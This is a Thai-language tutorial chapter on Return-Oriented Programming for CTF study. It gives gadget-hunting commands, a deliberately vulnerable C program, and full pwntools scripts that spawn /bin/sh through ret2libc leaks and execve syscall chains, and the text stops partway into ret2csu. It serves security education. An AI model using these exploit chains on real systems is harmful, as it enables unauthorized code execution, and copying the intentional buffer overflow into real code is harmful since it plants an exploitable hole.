# Part 073: Return-Oriented Programming (ROP)

> **บริบท**: เนื้อหานี้เป็นส่วนหนึ่งของหลักสูตร Assembly/Security สำหรับการศึกษาและ CTF competitions เท่านั้น  
> ใช้ความรู้นี้บนระบบที่ได้รับอนุญาตเท่านั้น (lab environments, CTF challenges, authorized penetration testing)

---

## สารบัญ

1. [ROP Concept: แนวคิดพื้นฐาน](#1-rop-concept)
2. [Gadget Types: ประเภทของ Gadgets](#2-gadget-types)
3. [Finding Gadgets: เครื่องมือค้นหา Gadgets](#3-finding-gadgets)
4. [Building ROP Chain Step by Step](#4-building-rop-chain)
5. [Example: execve("/bin/sh",0,0) via ROP](#5-example-execve)
6. [32-bit ROP: push args → int 0x80](#6-32-bit-rop)
7. [64-bit ROP: syscall convention](#7-64-bit-rop)
8. [ret2csu: __libc_csu_init Gadget](#8-ret2csu)
9. [SROP: Sigreturn-Oriented Programming](#9-srop)
10. [JOP: Jump-Oriented Programming](#10-jop)
11. [pwntools ROP Builder](#11-pwntools-rop)
12. [Defeating ASLR with ROP+Leak](#12-defeating-aslr)
13. [One-shot Gadget vs Manual Chain](#13-one-shot-gadget)
14. [Advanced Techniques และ Defense Bypasses](#14-advanced-techniques)
15. [CTF Examples และ Exercises](#15-ctf-examples)

---

## 1. ROP Concept

### 1.1 ทำไมต้องมี ROP?

ในอดีต buffer overflow attack นั้นง่ายมาก — inject shellcode แล้ว jump ไปที่มัน  
แต่มีการป้องกันสมัยใหม่ขึ้นมา:

```
การป้องกันที่ ROP ต้องเจอ:
┌─────────────────────────────────────────────────────────┐
│  NX / DEP (No-Execute / Data Execution Prevention)      │
│  → Stack และ heap ถูก mark เป็น non-executable          │
│  → Shellcode บน stack รัน ไม่ได้แล้ว                   │
│                                                          │
│  ASLR (Address Space Layout Randomization)               │
│  → ที่อยู่ของ library, stack, heap สุ่มทุกครั้ง         │
│  → ไม่รู้ว่า system(), /bin/sh อยู่ที่ไหน               │
│                                                          │
│  Stack Canaries                                          │
│  → ค่า random บน stack ตรวจ stack overflow              │
└─────────────────────────────────────────────────────────┘
```

**ROP (Return-Oriented Programming)** คือเทคนิคที่ใช้โค้ดที่มีอยู่ใน binary แล้ว  
แทนที่จะ inject shellcode ใหม่ เราใช้ "gadgets" ที่อยู่ใน executable memory

### 1.2 แนวคิดหลักของ ROP

```
แนวคิด ROP:
============

โปรแกรมปกติ:
  func() → ... → ret  (กลับไปที่ return address)

ROP Attack:
  แทน return address ด้วย address ของ "gadget"
  gadget คือ sequence ของ instructions ที่จบด้วย ret

  gadget1 → gadget2 → gadget3 → ... → shellcode_equivalent

ตัวอย่าง:
  Stack:           Code in memory:
  ┌──────────┐     
  │ gadget1  │ ──→ pop rdi; ret    ← gadget 1
  │ value1   │         ↓
  │ gadget2  │ ──→ pop rsi; ret    ← gadget 2
  │ value2   │         ↓
  │ gadget3  │ ──→ syscall; ret    ← gadget 3
  └──────────┘
```

### 1.3 กลไก ROP ทำงานอย่างไร

เมื่อ CPU execute `ret` instruction:
1. ดึงค่าจาก top of stack (`[rsp]`)
2. กำหนดค่านั้นให้ `rip` (instruction pointer)
3. เพิ่ม `rsp` ขึ้น 8 bytes (บน 64-bit)

```asm
; ret คือ equivalent ของ:
pop rip    ; ดึงค่าจาก stack ใส่ rip
; แล้ว jump ไปที่ rip

; ROP ใช้ประโยชน์จากนี้:
; ถ้าเราควบคุม stack ได้ เราควบคุม flow ได้
```

### 1.4 Stack Layout ใน ROP Attack

```
Buffer Overflow → Overwrite Return Address:

[normal stack]          [rop chain stack]
┌────────────┐          ┌────────────────────┐
│ local vars │          │ local vars         │
│ saved rbp  │          │ junk (fill buffer) │
│ ret addr   │  ──→     │ gadget1_addr       │ ← overwrite ret
│ caller rbx │          │ data_for_gadget1   │
└────────────┘          │ gadget2_addr       │
                        │ data_for_gadget2   │
                        │ gadget3_addr       │
                        │ ...                │
                        └────────────────────┘

เมื่อ vulnerable function return:
1. load gadget1_addr จาก stack → rip
2. gadget1 execute, จบด้วย ret
3. load gadget2_addr จาก stack → rip
4. gadget2 execute, จบด้วย ret
5. ... chain ต่อไปเรื่อยๆ
```

---

## 2. Gadget Types

### 2.1 ประเภทของ Gadgets

Gadget คือ short sequence ของ instructions ที่จบด้วย `ret`  
เราใช้ gadgets เหล่านี้สร้าง "program" ที่เราต้องการ

### 2.2 Load/Store Gadgets

```asm
; ===== POP REGISTER GADGETS =====
; ใช้ load ค่าจาก stack เข้า register

pop rdi; ret     ; load ค่าถัดไปบน stack → rdi
pop rsi; ret     ; load ค่าถัดไปบน stack → rsi
pop rdx; ret     ; load ค่าถัดไปบน stack → rdx
pop rcx; ret     ; load ค่าถัดไปบน stack → rcx
pop rax; ret     ; load ค่าถัดไปบน stack → rax
pop rbx; ret     ; load ค่าถัดไปบน stack → rbx

; Multi-pop gadgets:
pop rdi; pop rsi; ret   ; load 2 ค่าพร้อมกัน
pop rbx; pop rbp; ret   ; พบบ่อยใน prologue/epilogue

; ===== MEMORY WRITE GADGETS =====
; ใช้ write ค่าลง memory address

mov [rdi], rax; ret    ; write rax → memory ที่ rdi ชี้ไป
mov [rdi], rdx; ret    ; write rdx → memory ที่ rdi ชี้ไป
mov [rax], rbx; ret    ; write rbx → memory ที่ rax ชี้ไป
mov [rcx], rax; ret    ; write rax → memory ที่ rcx ชี้ไป

; ===== MEMORY READ GADGETS =====
; ใช้ read จาก memory เข้า register

mov rax, [rdi]; ret    ; read memory ที่ rdi ชี้ไป → rax
mov rbx, [rax]; ret    ; read memory ที่ rax ชี้ไป → rbx
```

### 2.3 Arithmetic Gadgets

```asm
; ===== ADD GADGETS =====
add rax, rbx; ret      ; rax += rbx
add rax, 1; ret        ; rax++
add [rdi], rax; ret    ; memory[rdi] += rax

; ===== XOR GADGETS (zero a register) =====
xor eax, eax; ret      ; eax = 0 (ทำ upper 32 bits เป็น 0 ด้วย)
xor rax, rax; ret      ; rax = 0

; ===== INC/DEC GADGETS =====
inc rax; ret
dec rbx; ret

; ===== SUB GADGETS =====
sub rax, rbx; ret
```

### 2.4 Syscall Gadgets

```asm
; 64-bit Linux syscall gadget (สำคัญมาก!)
syscall; ret           ; execute kernel syscall
syscall                ; ถ้าไม่มี ret ต้องหา variation อื่น

; 32-bit Linux interrupt gadget
int 0x80; ret          ; execute kernel syscall (32-bit)

; SYSENTER gadget
sysenter; ret
```

### 2.5 Control Flow Gadgets

```asm
; Jump ผ่าน indirect
jmp rax               ; อาจใช้ใน JOP (ไม่ใช่ ROP ปกติ)
call rax              ; อาจใช้ใน COP

; Conditional ที่ useful
test rax, rax; je 0x...; ret   ; complex gadget

; Leave gadget (stack pivot!)
leave; ret            ; mov rsp, rbp; pop rbp; ret
                      ; ใช้สำหรับ stack pivot
```

### 2.6 Stack Pivot Gadgets

Stack pivot คือการย้าย stack pointer ไปยังที่อื่น  
ใช้เมื่อ overflow buffer มีขนาดเล็กเกินไปสำหรับ full ROP chain

```asm
; ===== STACK PIVOT GADGETS =====

; xchg gadgets:
xchg rsp, rax; ret     ; swap rsp กับ rax
                       ; ถ้า rax = address ของ fake stack → pivot สำเร็จ

; add/sub rsp gadgets:
add rsp, 0x10; ret     ; ข้าม 2 entries บน stack
sub rsp, 0x100; ret    ; ขยับ stack ขึ้น

; pop rsp gadget (ทรงพลังมาก!):
pop rsp; ret           ; load new stack pointer จาก stack
                       ; ข้าม ไปที่ fake stack ทันที

; leave gadget (stack pivot via rbp):
leave; ret
; → mov rsp, rbp  (ใช้ saved rbp เป็น new stack)
; → pop rbp
; → ret           (จาก fake stack)
```

### 2.7 Gadget Encoding

บางครั้ง gadget ที่เราต้องการไม่มีในรูปแบบตรงๆ  
แต่อาจซ่อนอยู่ใน middle ของ instruction อื่น

```
ตัวอย่าง: การค้นหา "pop rdi; ret" จาก bytes

Instruction ปกติ:      FF 35 xx xx xx xx     (push [mem])
                       5F                     (pop rdi)
                       C3                     (ret)

แต่ถ้า binary มี:
                       ...
                       48 FF 35 xx xx xx xx  (push qword [mem])
                       5F C3                 ← hidden gadget!
                       ...

เราสามารถ jump ไปที่ offset ที่เริ่ม "5F C3" ได้!
bytes: 5F = pop rdi, C3 = ret → pop rdi; ret gadget!
```

---

## 3. Finding Gadgets

### 3.1 ROPgadget Tool

**ROPgadget** เป็น tool ยอดนิยมสำหรับหา gadgets

```bash
# ติดตั้ง ROPgadget
pip install ropgadget
# หรือ
pip3 install ROPgadget

# การใช้งานพื้นฐาน
ROPgadget --binary ./vuln

# ค้นหา gadget เฉพาะ
ROPgadget --binary ./vuln --rop

# ค้นหา string
ROPgadget --binary ./vuln --string "/bin/sh"

# ค้นหา gadget จาก libc
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop

# ค้นหา gadget แบบ regex
ROPgadget --binary ./vuln --re "pop rdi"

# รวม binary หลายตัว
ROPgadget --binary ./vuln --binary /lib/libc.so.6

# ค้นหา syscall gadgets
ROPgadget --binary ./vuln --re "syscall"

# output เป็น JSON
ROPgadget --binary ./vuln --json > gadgets.json

# ระบุ depth (จำนวน instructions สูงสุดใน gadget)
ROPgadget --binary ./vuln --depth 5

# ค้นหา pivot gadgets
ROPgadget --binary ./vuln --re "xchg.*rsp"
```

**ตัวอย่าง output:**

```
Gadgets information
============================================================
0x00000000004005e3 : add byte ptr [rax], al ; ret
0x0000000000400590 : nop ; pop rbp ; ret
0x0000000000400606 : pop rbp ; ret
0x0000000000400741 : pop rdi ; ret
0x000000000040073f : pop rsi ; pop r15 ; ret
0x000000000040073b : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
...
Unique gadgets found: 142
```

### 3.2 ropper Tool

**ropper** เป็น alternative ที่มี GUI และ features เพิ่มเติม

```bash
# ติดตั้ง ropper
pip install ropper

# การใช้งานพื้นฐาน
ropper --file ./vuln

# ค้นหา gadget เฉพาะ
ropper --file ./vuln --search "pop rdi"

# interactive mode
ropper
> file ./vuln
> search pop rdi
> stack

# ค้นหา syscall
ropper --file ./vuln --search "syscall"

# ค้นหา bad bytes (จะหลีกเลี่ยง bytes เหล่านี้)
ropper --file ./vuln --badbytes "00 0a 0d"

# แสดง ROP chains อัตโนมัติ
ropper --file ./vuln --chain execve

# ค้นหาจาก multiple files
ropper --file ./vuln --file /lib/libc.so.6
```

### 3.3 pwntools ROP Module

```python
from pwn import *

# Load binary
elf = ELF('./vuln')
rop = ROP(elf)

# หา gadgets
rop.find_gadget(['pop rdi', 'ret'])     # → [address]
rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
rop.find_gadget(['syscall'])

# ค้นหาจาก libc ด้วย
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop_libc = ROP(libc)

# สร้าง ROP chain อัตโนมัติ
rop.call('system', [next(elf.search(b'/bin/sh'))])
print(rop.dump())
```

### 3.4 Manual Gadget Search ด้วย objdump

```bash
# Disassemble binary
objdump -d ./vuln | grep -A2 "ret"

# หา "pop rdi; ret" ด้วย regex
objdump -d ./vuln | grep -B1 "ret" | grep "pop.*%rdi"

# หา bytes โดยตรง
# pop rdi = 5F, ret = C3
objdump -d ./vuln -M intel | grep "5f.*c3\|pop.*rdi"

# ค้นหา syscall
objdump -d ./vuln | grep "syscall\|int.*0x80"
```

### 3.5 ค้นหาใน Binary ด้วย Python

```python
#!/usr/bin/env python3
# simple_gadget_finder.py

import struct

def find_gadgets(binary_path, gadget_bytes):
    """ค้นหา gadget จาก byte pattern"""
    with open(binary_path, 'rb') as f:
        data = f.read()
    
    results = []
    pattern = bytes(gadget_bytes)
    offset = 0
    
    while True:
        pos = data.find(pattern, offset)
        if pos == -1:
            break
        results.append(pos)
        offset = pos + 1
    
    return results

# ค้นหา "pop rdi; ret" (bytes: 5F C3)
gadgets = find_gadgets('./vuln', [0x5F, 0xC3])
for addr in gadgets:
    print(f"Found pop rdi; ret at offset: 0x{addr:x}")

# ค้นหา "syscall; ret" (bytes: 0F 05 C3)
syscall_gadgets = find_gadgets('./vuln', [0x0F, 0x05, 0xC3])
```

### 3.6 ROPgadget Detailed Usage

```bash
# ===== ADVANCED ROPgadget USAGE =====

# ค้นหา gadgets ใน specific section
ROPgadget --binary ./vuln --section .text

# ค้นหา ret-only gadget (สำหรับ alignment)
ROPgadget --binary ./vuln --re "^ret$"

# ค้นหา gadgets สำหรับ execve syscall
ROPgadget --binary ./vuln --re "pop rax"
ROPgadget --binary ./vuln --re "pop rdi"
ROPgadget --binary ./vuln --re "pop rsi"
ROPgadget --binary ./vuln --re "pop rdx"
ROPgadget --binary ./vuln --re "syscall"

# สร้าง rop chain อัตโนมัติ (ไม่ค่อย reliable)
ROPgadget --binary ./vuln --ropchain

# ค้นหา write-what-where gadgets
ROPgadget --binary ./vuln --re "mov \[r"

# ค้นหา stack pivot
ROPgadget --binary ./vuln --re "xchg rsp"
ROPgadget --binary ./vuln --re "pop rsp"
```

---

## 4. Building ROP Chain Step by Step

### 4.1 กระบวนการสร้าง ROP Chain

```
ขั้นตอนการสร้าง ROP Chain:

1. RECON
   → ตรวจสอบ security mitigations (checksec)
   → หา vulnerability (buffer overflow, etc.)
   → หาขนาด overflow ที่ต้องใช้

2. GADGET HUNTING
   → ค้นหา gadgets ที่ต้องการ
   → จดบันทึก addresses

3. CHAIN DESIGN
   → วางแผน logic ที่ต้องการ
   → จัด sequence ของ gadgets

4. PAYLOAD CONSTRUCTION
   → เขียน exploit code
   → ทดสอบ locally

5. LEAK (ถ้า ASLR เปิด)
   → หา information leak
   → คำนวณ libc base address
   → ปรับ addresses ตาม leak

6. FINAL EXPLOIT
   → รวมทุกอย่าง
   → ส่ง payload
```

### 4.2 checksec - ตรวจสอบ Security

```bash
# ตรวจสอบ security features ของ binary
checksec --file=./vuln

# ตัวอย่าง output:
# [*] './vuln'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled         ← NX เปิด ต้องใช้ ROP
#     PIE:      No PIE             ← PIE ปิด addresses คงที่
#     RUNPATH:  b'.'

# ใน pwntools:
from pwn import *
elf = ELF('./vuln')
print(elf.checksec())
```

### 4.3 หา Buffer Overflow Offset

```python
#!/usr/bin/env python3
# find_offset.py

from pwn import *

# Method 1: Cyclic pattern
io = process('./vuln')
io.sendline(cyclic(200))
io.wait()
core = io.corefile

# หา offset จาก crash
print(f"RSP: {hex(core.rsp)}")
print(f"Offset: {cyclic_find(core.read(core.rsp, 4))}")

# Method 2: Manual binary search
# ส่ง payload ขนาดต่างๆ จนหา crash point
for i in range(0, 200, 8):
    p = process('./vuln')
    p.sendline(b'A' * i)
    p.wait()
    if p.returncode == -11:  # SIGSEGV
        print(f"Crash at: {i}")
        break
    p.close()
```

```bash
# ใช้ GDB + pwndbg/peda
gdb -q ./vuln
(gdb) pattern create 200
(gdb) run <<< $(python3 -c "print('Aa0Aa1Aa2...')")
(gdb) pattern search $rsp
# → Found at offset XX
```

### 4.4 ตัวอย่าง Vulnerable Program

```c
// vuln.c - ตัวอย่าง vulnerable program สำหรับ CTF
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

// สำหรับ CTF เท่านั้น - ตัวอย่าง intentional vulnerability
void vuln_func() {
    char buf[64];
    printf("Enter input: ");
    fflush(stdout);
    read(0, buf, 256);    // buffer overflow! อ่าน 256 bytes ลง 64-byte buffer
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vuln_func();
    return 0;
}

// compile: gcc -o vuln vuln.c -fno-stack-protector -no-pie
// checksec: NX enabled, no canary, no PIE
```

### 4.5 สร้าง ROP Chain ทีละขั้น

```python
#!/usr/bin/env python3
# rop_chain_builder.py

from pwn import *

# ===== STEP 1: Load binary =====
context.arch = 'amd64'
context.os = 'linux'
elf = ELF('./vuln')

# ===== STEP 2: Find gadgets =====
rop = ROP(elf)

# หา pop rdi; ret
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f"pop rdi; ret: {hex(pop_rdi)}")

# หา pop rsi; pop r15; ret (พบบ่อยใน 64-bit binaries)
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
print(f"pop rsi; pop r15; ret: {hex(pop_rsi_r15)}")

# หา ret (สำหรับ stack alignment ก่อน system call)
ret_gadget = rop.find_gadget(['ret'])[0]
print(f"ret: {hex(ret_gadget)}")

# ===== STEP 3: Find strings =====
binsh = next(elf.search(b'/bin/sh\x00'))
print(f"/bin/sh: {hex(binsh)}")

# ===== STEP 4: Find functions =====
system_addr = elf.plt['system']
print(f"system@plt: {hex(system_addr)}")

# ===== STEP 5: Calculate offset =====
offset = 72  # bytes จาก buffer start ถึง return address

# ===== STEP 6: Build payload =====
payload = b'A' * offset          # fill buffer
payload += p64(ret_gadget)       # stack alignment (Ubuntu 18.04+)
payload += p64(pop_rdi)          # gadget: pop rdi; ret
payload += p64(binsh)            # value: address of "/bin/sh"
payload += p64(system_addr)      # call system("/bin/sh")

print(f"\nPayload length: {len(payload)}")

# ===== STEP 7: Send payload =====
io = process('./vuln')
io.sendline(payload)
io.interactive()
```

---

## 5. Example: execve("/bin/sh",0,0) via ROP Syscalls

### 5.1 execve Syscall Overview

```
execve syscall:
  syscall number: 59 (0x3b) on x86-64 Linux
  
  int execve(const char *pathname, char *const argv[], char *const envp[]);
  
  Arguments:
    rdi = pathname  → pointer to "/bin/sh\0"
    rsi = argv      → NULL (0)
    rdx = envp      → NULL (0)
    rax = 59        → syscall number
```

### 5.2 Step-by-Step execve via ROP

```python
#!/usr/bin/env python3
# execve_rop.py

from pwn import *

context.arch = 'amd64'

elf = ELF('./vuln')

# ===== หา gadgets ที่ต้องการ =====
# 1. pop rdi; ret  → set rdi = address of "/bin/sh"
# 2. pop rsi; ret  → set rsi = 0
# 3. pop rdx; ret  → set rdx = 0
# 4. pop rax; ret  → set rax = 59 (execve syscall number)
# 5. syscall       → execute syscall

rop = ROP(elf)

gadgets = {
    'pop_rdi': rop.find_gadget(['pop rdi', 'ret'])[0],
    'pop_rsi': rop.find_gadget(['pop rsi', 'ret'])[0],  # อาจไม่มี ต้องหา alternative
    'pop_rdx': rop.find_gadget(['pop rdx', 'ret'])[0],  # อาจไม่มีใน binary
    'pop_rax': rop.find_gadget(['pop rax', 'ret'])[0],
    'syscall': rop.find_gadget(['syscall'])[0],
}

# หา "/bin/sh" string ใน binary หรือ libc
# วิธี 1: ถ้ามีใน binary
try:
    binsh_addr = next(elf.search(b'/bin/sh\x00'))
    print(f"Found /bin/sh in binary: {hex(binsh_addr)}")
except StopIteration:
    print("No /bin/sh in binary, will write it")
    # วิธี 2: เขียน "/bin/sh" เข้า writable memory
    # ต้องใช้ gadgets เพิ่ม

for name, addr in gadgets.items():
    print(f"{name}: {hex(addr)}")

# ===== สร้าง ROP chain =====
offset = 72

payload = flat(
    b'A' * offset,
    # Step 1: set rdi = address of "/bin/sh"
    gadgets['pop_rdi'],
    binsh_addr,
    # Step 2: set rsi = 0 (NULL argv)
    gadgets['pop_rsi'],
    0,
    # Step 3: set rdx = 0 (NULL envp)
    gadgets['pop_rdx'],
    0,
    # Step 4: set rax = 59 (execve syscall number)
    gadgets['pop_rax'],
    59,
    # Step 5: execute syscall
    gadgets['syscall'],
)

io = process('./vuln')
io.sendline(payload)
io.interactive()
```

### 5.3 กรณีที่ไม่มี "/bin/sh" ใน Binary

```python
#!/usr/bin/env python3
# write_binsh_rop.py

from pwn import *

context.arch = 'amd64'
elf = ELF('./vuln')
rop = ROP(elf)

# ===== หา writable memory address =====
# .bss section เป็น writable
bss_addr = elf.bss()
print(f"BSS address: {hex(bss_addr)}")

# ===== หา gadgets สำหรับ write =====
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
# ต้องการ: mov [rdi], rax; ret
# หรือ: mov [rax], rbx; ret

# ===== เขียน "/bin/sh" เข้า bss =====
# "/bin/sh\x00" = 8 bytes = 1 qword

payload_write = flat(
    b'A' * offset,
    # write 8 bytes ของ "/bin/sh\x00" ไปที่ bss
    pop_rdi_rax_gadget,   # pseudo-code
    bss_addr,
    b'/bin/sh\x00',       # value to write
    write_gadget,         # mov [rdi], rax; ret
    
    # จากนั้น call execve
    pop_rdi,
    bss_addr,
    # ... ต่อ
)
```

### 5.4 ตัวอย่างสมบูรณ์: ret2libc + ROP

```python
#!/usr/bin/env python3
# ret2libc_complete.py
# สำหรับ CTF เท่านั้น

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def start():
    return process('./vuln')

# ===== STAGE 1: Leak libc address =====
def leak_libc():
    io = start()
    rop = ROP(elf)
    
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    
    # Leak puts@got ด้วย puts@plt
    payload = flat(
        b'A' * 72,
        ret,             # stack alignment
        pop_rdi,
        elf.got['puts'],   # argument: address ของ puts@got
        elf.plt['puts'],   # call puts(puts@got)
        elf.symbols['main'],  # กลับมา main หลัง leak
    )
    
    io.sendline(payload)
    
    # รับ leak
    leak = u64(io.recvline()[:8].ljust(8, b'\x00'))
    print(f"puts@libc: {hex(leak)}")
    
    # คำนวณ libc base
    libc_base = leak - libc.symbols['puts']
    print(f"libc base: {hex(libc_base)}")
    
    return io, libc_base

# ===== STAGE 2: Execute /bin/sh =====
def get_shell(io, libc_base):
    libc.address = libc_base
    
    rop = ROP([elf, libc])
    
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.symbols['system']
    
    payload = flat(
        b'A' * 72,
        ret,
        pop_rdi,
        binsh,
        system,
    )
    
    io.sendline(payload)
    io.interactive()

io, libc_base = leak_libc()
get_shell(io, libc_base)
```

---

## 6. 32-bit ROP: push args → int 0x80

### 6.1 32-bit Calling Convention

```
32-bit Linux Syscall Convention (int 0x80):
  eax = syscall number
  ebx = arg1
  ecx = arg2
  edx = arg3
  esi = arg4
  edi = arg5
  
  int 0x80  → execute syscall
```

### 6.2 execve บน 32-bit ด้วย int 0x80

```asm
; 32-bit execve("/bin/sh", 0, 0) via int 0x80

; เตรียม arguments:
; eax = 11 (execve syscall number บน 32-bit)
; ebx = address of "/bin/sh"
; ecx = 0 (NULL argv)
; edx = 0 (NULL envp)

mov eax, 11          ; syscall number
mov ebx, binsh_addr  ; pathname
xor ecx, ecx         ; argv = NULL
xor edx, edx         ; envp = NULL
int 0x80             ; execute!
```

### 6.3 32-bit ROP Chain ด้วย Stack Arguments

```python
#!/usr/bin/env python3
# rop_32bit.py

from pwn import *

context.arch = 'i386'  # 32-bit

elf = ELF('./vuln32')
rop = ROP(elf)

# บน 32-bit, function arguments ถูกส่งผ่าน stack
# ไม่ใช่ registers!

# system("/bin/sh") บน 32-bit:
# stack ต้องเป็น: [system_addr] [ret_addr] ["/bin/sh"]

# หา addresses
system_addr = elf.plt['system']  # หรือจาก libc
binsh_addr = next(elf.search(b'/bin/sh\x00'))
fake_ret = 0xdeadbeef  # placeholder return address

# offset ถึง return address
offset = 76  # สำหรับ 32-bit ปกติ

payload = flat(
    b'A' * offset,
    system_addr,     # call system()
    fake_ret,        # return address หลัง system() return
    binsh_addr,      # argument: "/bin/sh"
)

io = process('./vuln32')
io.sendline(payload)
io.interactive()
```

### 6.4 32-bit ROP ด้วย int 0x80 Gadgets

```python
#!/usr/bin/env python3
# rop_int80.py

from pwn import *

context.arch = 'i386'

elf = ELF('./vuln32')
rop = ROP(elf)

# หา gadgets
pop_eax = rop.find_gadget(['pop eax', 'ret'])[0]
pop_ebx = rop.find_gadget(['pop ebx', 'ret'])[0]
pop_ecx = rop.find_gadget(['pop ecx', 'ret'])[0]
pop_edx = rop.find_gadget(['pop edx', 'ret'])[0]
int80 = rop.find_gadget(['int 0x80'])[0]

# หา "/bin/sh"
binsh = next(elf.search(b'/bin/sh\x00'))

offset = 76

# ===== execve("/bin/sh", 0, 0) ผ่าน int 0x80 =====
payload = flat(
    b'A' * offset,
    
    # set eax = 11 (execve syscall number)
    pop_eax,
    11,
    
    # set ebx = address of "/bin/sh"
    pop_ebx,
    binsh,
    
    # set ecx = 0
    pop_ecx,
    0,
    
    # set edx = 0
    pop_edx,
    0,
    
    # int 0x80
    int80,
)

io = process('./vuln32')
io.sendline(payload)
io.interactive()
```

### 6.5 Multi-Pop Gadgets บน 32-bit

```asm
; พบบ่อยใน 32-bit binaries:
pop ebx; pop ecx; pop edx; ret   ; load 3 values จาก stack
pop ebx; pop esi; pop edi; ret
pop esi; pop edi; pop ebp; ret   ; พบจาก function prologue

; ใช้งาน:
; stack layout สำหรับ pop ebx; pop ecx; pop edx; ret:
; [gadget_addr] [ebx_value] [ecx_value] [edx_value] [next_addr]
```

---

## 7. 64-bit ROP: set rax=59, rdi=ptr, rsi=0, rdx=0 → syscall

### 7.1 64-bit Calling Convention

```
64-bit Linux Syscall Convention:
  rax = syscall number
  rdi = arg1
  rsi = arg2
  rdx = arg3
  r10 = arg4
  r8  = arg5
  r9  = arg6
  
  syscall  → execute syscall
  
สำหรับ execve:
  rax = 59   (execve syscall number)
  rdi = ptr  (pathname → "/bin/sh")
  rsi = 0    (argv = NULL)
  rdx = 0    (envp = NULL)
```

### 7.2 64-bit execve ROP Chain

```python
#!/usr/bin/env python3
# execve_64bit.py

from pwn import *

context.arch = 'amd64'

elf = ELF('./vuln64')
rop = ROP(elf)

# หา gadgets ที่จำเป็น
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]   # อาจเป็น pop rsi; pop r15; ret
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]

# หา "/bin/sh" string
binsh = next(elf.search(b'/bin/sh\x00'))

offset = 72  # offset ถึง return address

# ===== Build ROP Chain =====
payload = flat(
    b'A' * offset,    # fill buffer
    
    # rax = 59 (execve)
    pop_rax,
    59,
    
    # rdi = address of "/bin/sh"
    pop_rdi,
    binsh,
    
    # rsi = 0 (NULL argv)
    pop_rsi,
    0,
    
    # rdx = 0 (NULL envp)
    pop_rdx,
    0,
    
    # syscall
    syscall,
)

io = process('./vuln64')
io.sendline(payload)
io.interactive()
```

### 7.3 Stack Alignment Issue บน 64-bit

```python
# บน Ubuntu 18.04+ ระบบ requires 16-byte stack alignment
# ก่อน call system() (เนื่องจาก movaps instruction ใน glibc)

# วิธีแก้: เพิ่ม ret gadget ก่อน system()

ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A' * offset,
    ret_gadget,      # ← stack alignment!
    pop_rdi,
    binsh,
    system_addr,
)

# ทำไม ret ช่วย?
# ret เพิ่ม rsp ขึ้น 8 bytes → ปรับ alignment
```

### 7.4 เมื่อ pop rdx ไม่มีใน Binary

```python
# ปัญหาทั่วไป: หา pop rdx ไม่ได้ใน binary เล็กๆ

# วิธีแก้ 1: ใช้ libc gadgets
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop_libc = ROP(libc)
pop_rdx_libc = rop_libc.find_gadget(['pop rdx', 'ret'])[0]
# ต้อง + libc_base offset

# วิธีแก้ 2: ใช้ ret2csu (เพิ่มเติมในหัวข้อถัดไป)

# วิธีแก้ 3: ใช้ xor rdx, rdx gadget
xor_rdx = rop.find_gadget(['xor rdx', 'rdx', 'ret'])[0]

# วิธีแก้ 4: ถ้า rdx เป็น 0 อยู่แล้ว (หลัง function return)
# บางครั้ง rdx เป็น 0 อยู่แล้ว ไม่ต้อง set ก็ได้
```

---

## 8. ret2csu: __libc_csu_init Gadget

### 8.1 __libc_csu_init คืออะไร?

ใน Linux ELF binaries ส่วนใหญ่ มี function `__libc_csu_init` ที่ compiler generate ให้อัตโนมัติ  
Function นี้มี gadgets ที่ทรงพลังมาก โดยเฉพาะสำหรับการ set rdx

```asm
; __libc_csu_init ทั่วไป (gcc output):
; Location: ท้าย .text section

0x400610 <__libc_csu_init>:
    push   r15
    push   r14
    push   r13
    push   r12
    push   rbp
    push   rbx
    sub    rsp, 0x8
    ...

; "Gadget B" - อยู่ประมาณ offset 0x3a จาก function start:
0x40064a <__libc_csu_init+90>:   ; ← เริ่มจากที่นี่ (gadget B)
    pop    rbx
    pop    rbp
    pop    r12
    pop    r13
    pop    r14
    pop    r15
    ret

; "Gadget A" - อยู่ก่อน Gadget B ประมาณ 0x1a bytes:
0x400630 <__libc_csu_init+64>:   ; ← gadget A
    mov    rdx, r15
    mov    rsi, r14
    mov    edi, r13d    ; ← note: edi (32-bit) ไม่ใช่ rdi
    call   [r12+rbx*8]
    add    rbx, 1
    cmp    rbx, rbp
    jne    0x400630
    ...
    ; จาก 0x400648:
0x400648:
    add    rsp, 0x8
    pop    rbx
    pop    rbp
    pop    r12
    pop    r13
    pop    r14
    pop    r15
    ret
```

### 8.2 ret2csu Technique

```python
#!/usr/bin/env python3
# ret2csu.py

from pwn import *

context.arch = 'amd64'

elf = ELF('./vuln64')

# ===== หา __libc_csu_init gadgets =====
# Gadget B: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# Gadget A: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]; ...

# หา offset ของ __libc_csu_init
csu_init = elf.symbols['__libc_csu_init']
gadget_A = csu_init + 0x1a   # adjust offset per binary
gadget_B = csu_init + 0x34   # adjust offset per binary

# หรือหาจาก disassembly
# ROPgadget --binary ./vuln --re "pop rbx"

